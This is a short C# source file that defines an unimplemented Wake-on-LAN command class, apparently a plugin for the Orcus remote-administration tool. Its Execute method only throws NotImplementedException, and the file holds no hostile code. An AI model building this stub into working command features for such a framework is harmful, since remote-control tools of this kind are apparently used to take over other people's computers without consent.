using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Computer
{
    [OfflineAvailable]
    public class WakeOnLanCommand : StaticCommand
    {
        public override Guid CommandId { get; } = new Guid(0xd25b1de9, 0xef0b, 0x1f49, 0xb3, 0xe1, 0x14, 0x11, 0x13,
            0xdf, 0xd3, 0xef);

        public override string Name { get; } = Resources.StaticCommands.Computer_WakeOnLanCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Computer_WakeOnLanCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Computer;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }
    }
}